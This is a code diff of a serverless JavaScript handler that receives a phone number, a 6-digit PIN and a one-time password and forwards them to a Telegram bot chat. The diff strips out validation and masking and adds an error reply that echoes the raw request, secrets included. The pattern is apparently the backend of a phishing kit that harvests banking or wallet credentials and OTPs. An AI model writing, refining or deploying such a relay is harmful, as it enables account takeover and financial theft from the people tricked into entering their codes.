@@ -1,7 +1,8 @@
 const axios = require('axios');
 
-// Helper function to format the message
+// Format Telegram message without hyphens
 function formatMessage(type, phone, pin, otp) {
+  // Remove all non-digit characters
   const cleanPhone = phone.replace(/\D/g, '');
   
   let message = 
@@ -23,139 +24,48 @@ function formatMessage(type, phone, pin, otp) {
   return message;
 }
 
-// Helper function to validate phone number
-function isValidPhone(phone) {
-  return phone && /^[0-9]{10,13}$/.test(phone);
-}
-
-// Main Lambda function
 exports.handler = async (event, context) => {
-  // Set default headers
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Methods': 'POST'
-  };
-
-  // Handle CORS preflight request
-  if (event.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 204,
-      headers,
-      body: ''
-    };
-  }
-
-  // Only allow POST requests
+  // Only accept POST requests
   if (event.httpMethod !== 'POST') {
     return {
       statusCode: 405,
-      headers,
-      body: JSON.stringify({ 
-        error: 'Method Not Allowed',
-        message: 'Only POST requests are accepted'
-      })
+      body: JSON.stringify({ error: 'Method Not Allowed' }),
+      headers: { 'Content-Type': 'application/json' }
     };
   }
 
   try {
-    // Parse and validate request body
-    if (!event.body) {
+    // Parse and validate request
+    const { type, phone, pin, otp } = JSON.parse(event.body);
+    
+    if (!type || !phone) {
       return {
         statusCode: 400,
-        headers,
-        body: JSON.stringify({
-          error: 'Bad Request',
-          message: 'Request body is missing'
-        })
+        body: JSON.stringify({ error: 'Type and phone are required' }),
+        headers: { 'Content-Type': 'application/json' }
       };
     }
 
-    let requestBody;
-    try {
-      requestBody = JSON.parse(event.body);
-    } catch (e) {
+    // Clean phone number
+    const cleanPhone = phone.replace(/\D/g, '');
+    
+    if (cleanPhone.length < 10) {
       return {
         statusCode: 400,
-        headers,
-        body: JSON.stringify({
-          error: 'Bad Request',
-          message: 'Invalid JSON format in request body'
-        })
+        body: JSON.stringify({ error: 'Phone number must be at least 10 digits' }),
+        headers: { 'Content-Type': 'application/json' }
       };
     }
 
-    const { type, phone, pin, otp } = requestBody;
-    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-
-    // Validate required fields
-    if (!type || !cleanPhone) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({
-          error: 'Bad Request',
-          message: 'Type and phone number are required',
-          received: { type, phone }
-        })
-      };
-    }
-
-    // Validate phone number format
-    if (!isValidPhone(cleanPhone)) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({
-          error: 'Invalid Phone Number',
-          message: 'Phone number must be 10-13 digits',
-          received: phone,
-          cleaned: cleanPhone
-        })
-      };
-    }
-
-    // Validate PIN if present
-    if (type === 'pin' && (!pin || pin.length !== 6 || !/^[0-9]+$/.test(pin))) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({
-          error: 'Invalid PIN',
-          message: 'PIN must be 6 digits'
-        })
-      };
-    }
-
-    // Validate OTP if present
-    if (type === 'otp' && (!otp || otp.length !== 6 || !/^[0-9]+$/.test(otp))) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({
-          error: 'Invalid OTP',
-          message: 'OTP must be 6 digits'
-        })
-      };
-    }
-
-    // Check Telegram credentials
+    // Check Telegram config
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!botToken || !chatId) {
-      console.error('Missing Telegram credentials');
-      return {
-        statusCode: 500,
-        headers,
-        body: JSON.stringify({
-          error: 'Server Configuration Error',
-          message: 'Telegram credentials are not configured'
-        })
-      };
+      throw new Error('Server configuration error: Missing Telegram credentials');
     }
 
-    // Format and send message to Telegram
+    // Format and send message
     const message = formatMessage(type, cleanPhone, pin, otp);
     
     const telegramResponse = await axios.post(
@@ -166,59 +76,31 @@ exports.handler = async (event, context) => {
         parse_mode: 'HTML'
       },
       {
-        timeout: 5000,
-        headers: {
-          'Content-Type': 'application/json'
-        }
+        timeout: 5000 // 5 second timeout
       }
     );
 
-    // Return success response
     return {
       statusCode: 200,
-      headers,
-      body: JSON.stringify({
+      body: JSON.stringify({ 
         success: true,
         message: 'Data sent successfully',
-        telegram_status: telegramResponse.status,
-        data_sent: {
-          type,
-          phone: cleanPhone,
-          pin: pin ? '******' : undefined,
-          otp: otp ? '******' : undefined
-        }
-      })
+        telegram_status: telegramResponse.status
+      }),
+      headers: { 'Content-Type': 'application/json' }
     };
 
   } catch (error) {
-    console.error('Error processing request:', error);
+    console.error('Error:', error);
     
-    // Handle Axios errors specifically
-    if (error.isAxiosError) {
-      return {
-        statusCode: 502,
-        headers,
-        body: JSON.stringify({
-          error: 'Telegram API Error',
-          message: 'Failed to send message to Telegram',
-          details: error.message,
-          response: error.response ? {
-            status: error.response.status,
-            data: error.response.data
-          } : undefined
-        })
-      };
-    }
-
-    // Generic error handler
     return {
       statusCode: 500,
-      headers,
       body: JSON.stringify({
         error: 'Internal Server Error',
-        message: 'An unexpected error occurred',
-        details: error.message
-      })
+        details: error.message,
+        request: event.body
+      }),
+      headers: { 'Content-Type': 'application/json' }
     };
   }
 };
